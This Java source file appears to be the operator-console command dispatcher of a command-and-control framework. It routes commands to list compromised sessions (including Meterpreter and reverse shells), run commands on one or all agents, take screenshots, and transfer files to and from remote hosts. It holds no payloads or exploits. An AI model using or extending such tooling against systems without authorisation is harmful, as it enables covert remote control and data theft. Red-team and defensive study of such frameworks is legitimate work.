package com.raven.interfaces.GUI.module.core.server;

import com.raven.core.db.TeamDatabase;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import com.raven.interfaces.GUI.module.core.session.SessionManager;
import javafx.application.Platform;
import javafx.scene.control.TextField;

import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.Executors;
import java.util.function.Consumer;

public class CommandDispatcher {

    private final RavenServer Server;
    private final TeamDatabase Db;
    private final SessionManager SessionMgr;
    private final Consumer<String> LogSink;
    private final String OperatorName;

    public CommandDispatcher(RavenServer server, TeamDatabase db,
                              SessionManager sessionMgr,
                              Consumer<String> logSink,
                              String operatorName) {
        this.Server = server;
        this.Db = db;
        this.SessionMgr = sessionMgr;
        this.LogSink = logSink;
        this.OperatorName = operatorName;
    }

    public void Dispatch(String Cmd, TextField Input) {
        if (Cmd == null || Cmd.isBlank()) return;
        if (Server == null || !Server.IsRunning()) {
            LogSink.accept("[!] Server not running");
            return;
        }
        String[] Parts = Cmd.trim().split("\\s+", 2);
        switch (Parts[0].toLowerCase()) {
            case "sessions", "agents" -> DispatchSessions();
            case "kill"               -> DispatchKill(Parts);
            case "status"             -> DispatchStatus();
            case "stats"              -> DispatchStats();
            case "tasks"              -> DispatchTasks();
            case "broadcast"          -> DispatchBroadcast(Parts);
            case "exec"               -> DispatchExec(Parts.length > 1 ? Parts[1] : "");
            case "whoami", "screenshot" -> DispatchShortcut(Parts, Parts[0].toLowerCase());
            case "sleep"              -> DispatchSleep(Parts);
            case "download"           -> DispatchDownload(Parts);
            case "upload"             -> DispatchUpload(Parts);
            case "sysinfo", "info"    -> DispatchSysInfo(Parts.length > 1 ? Parts[1] : "");
            case "note"               -> DispatchNote(Parts.length > 1 ? Parts[1] : "");
            case "getnote"            -> DispatchGetNote(Parts.length > 1 ? Parts[1] : "");
            case "history"            -> DispatchHistory(Parts.length > 1 ? Parts[1] : "");
            default                   -> LogSink.accept("[!] Unknown command: " + Parts[0]);
        }
        if (Input != null) Platform.runLater(Input::clear);
    }

    private void DispatchSessions() {
        int N = Server.GetSessions().Count();
        LogSink.accept("[*] Sessions (" + N + "):");
        Server.GetSessions().GetAll()
            .forEach(S -> LogSink.accept("    #" + S.GetId() + " [" + S.GetDisplayName() + "] "
                + S.GetUser() + "@" + S.GetHostname() + " key=" + S.GetSessionKey()));
        Platform.runLater(SessionMgr::Refresh);
    }

    private void DispatchKill(String[] Parts) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: kill <id>"); return; }
        try {
            int Id = Integer.parseInt(Parts[1].trim());
            Server.RemoveSession(Id);
            LogSink.accept("[+] Session-" + Id + " terminated");
            Platform.runLater(SessionMgr::Refresh);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchStatus() {
        LogSink.accept("[*] Status: " + (Server.IsRunning() ? "ONLINE" : "OFFLINE"));
        LogSink.accept("[*] Mode: " + Server.GetMode().name() + " | Host: " + Server.GetHost() + ":" + Server.GetPort());
        LogSink.accept("[*] Sessions: " + Server.GetSessions().Count());
        LogSink.accept("[*] Key: " + Server.GetKeyBase64());
    }

    private void DispatchStats() {
        Map<String, Integer> Stats = Server.GetSessions().GetStats();
        LogSink.accept("[*] Total: " + Stats.get("Total"));
        LogSink.accept("[*] RAVEN: " + Stats.get("RAVEN"));
        LogSink.accept("[*] Meterpreter: " + Stats.get("METERPRETER"));
        LogSink.accept("[*] Reverse Shell: " + Stats.get("REVERSE_SHELL"));
    }

    private void DispatchTasks() {
        LogSink.accept("[*] Active sessions: " + Server.GetSessions().Count() + " — use exec/broadcast to run tasks");
    }

    private void DispatchBroadcast(String[] Parts) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: broadcast <cmd>"); return; }
        String BCmd = Parts[1];
        LogSink.accept("[>] Broadcast → " + BCmd);
        Map<Integer, String[]> R = Server.BroadcastAll(BCmd);
        R.forEach((Id, Res) -> LogSink.accept("    [" + Id + "] " + (Boolean.parseBoolean(Res[0]) ? "✔ " : "✘ ") + Res[1]));
    }

    private void DispatchExec(String Body) {
        String[] Args = Body.trim().split("\\s+", 2);
        if (Args.length < 2) { LogSink.accept("[!] Usage: exec <id> <command>"); return; }
        try {
            int Sid = Integer.parseInt(Args[0]);
            SessionMgr.RunAgentCommand(Sid, Args[1], OperatorName, LogSink);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchShortcut(String[] Parts, String Command) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: " + Command + " <id>"); return; }
        try {
            SessionMgr.RunAgentCommand(Integer.parseInt(Parts[1]), Command, OperatorName, LogSink);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchSleep(String[] Parts) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: sleep <id> <seconds>"); return; }
        String[] Args = Parts[1].split("\\s+", 2);
        if (Args.length < 2) { LogSink.accept("[!] Usage: sleep <id> <seconds>"); return; }
        try {
            SessionMgr.RunAgentCommand(Integer.parseInt(Args[0]), "sleep " + Args[1], OperatorName, LogSink);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchDownload(String[] Parts) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: download <id> <remote-path>"); return; }
        String[] Args = Parts[1].split("\\s+", 2);
        if (Args.length < 2) { LogSink.accept("[!] Usage: download <id> <remote-path>"); return; }
        try {
            SessionMgr.RunAgentCommand(Integer.parseInt(Args[0]), "download " + Args[1], OperatorName, LogSink);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchUpload(String[] Parts) {
        if (Parts.length < 2) { LogSink.accept("[!] Usage: upload <id> <local-path> <remote-path>"); return; }
        String[] Args = Parts[1].split("\\s+", 3);
        if (Args.length < 3) { LogSink.accept("[!] Usage: upload <id> <local-path> <remote-path>"); return; }
        try {
            SessionMgr.RunAgentCommand(Integer.parseInt(Args[0]), "upload " + Args[1] + " " + Args[2], OperatorName, LogSink);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchSysInfo(String SidText) {
        try {
            int Sid = Integer.parseInt(SidText.trim());
            Optional<Session> Opt = SessionMgr.Get(Sid);
            if (Opt.isEmpty()) { LogSink.accept("[!] Session not found"); return; }
            Session S = Opt.get();
            LogSink.accept("[*] ID=" + S.GetId() + " Name=" + S.GetDisplayName() + " Type=" + S.GetSessionType().name());
            LogSink.accept("[*] Host=" + S.GetHostname() + " User=" + S.GetUser() + " OS=" + S.GetOs() + " Arch=" + S.GetArch());
            LogSink.accept("[*] IP=" + S.GetAgentIp() + " Key=" + S.GetSessionKey() + " mTLS=" + S.IsMtlsEnabled());
            LogSink.accept("[*] Note=" + Db.GetAgentNote(Sid));
        } catch (Exception E) {
            LogSink.accept("[!] Usage: sysinfo <id>");
        }
    }

    private void DispatchNote(String Body) {
        String[] Args = Body.trim().split("\\s+", 2);
        if (Args.length < 2) { LogSink.accept("[!] Usage: note <id> <text>"); return; }
        try {
            int Sid = Integer.parseInt(Args[0]);
            Db.SetAgentNote(Sid, Args[1]);
            LogSink.accept("[+] Note saved for SESSION-" + Sid);
        } catch (NumberFormatException E) {
            LogSink.accept("[!] Invalid session ID");
        }
    }

    private void DispatchGetNote(String SidText) {
        try {
            int Sid = Integer.parseInt(SidText.trim());
            String Note = Db.GetAgentNote(Sid);
            LogSink.accept("[*] Note SESSION-" + Sid + ": " + (Note.isEmpty() ? "(empty)" : Note));
        } catch (Exception E) {
            LogSink.accept("[!] Usage: getnote <id>");
        }
    }

    private void DispatchHistory(String Body) {
        String[] Args = Body == null || Body.isBlank() ? new String[0] : Body.trim().split("\\s+");
        int Sid = Args.length > 0 ? ParseInt(Args[0], 0) : 0;
        int Limit = Args.length > 1 ? ParseInt(Args[1], 25) : 25;
        List<Map<String, Object>> Hist = Db.GetCommandHistory(Sid, Limit);
        LogSink.accept("[*] History entries: " + Hist.size());
        for (Map<String, Object> R : Hist)
            LogSink.accept("    #" + R.getOrDefault("AgentId", "?") + " " + R.getOrDefault("Operator", "?")
                + " " + R.getOrDefault("Command", "") + " [" + R.getOrDefault("Timestamp", "") + "]");
    }

    private int ParseInt(String Value, int Def) {
        try { return Integer.parseInt(Value.trim()); }
        catch (Exception E) { return Def; }
    }
}
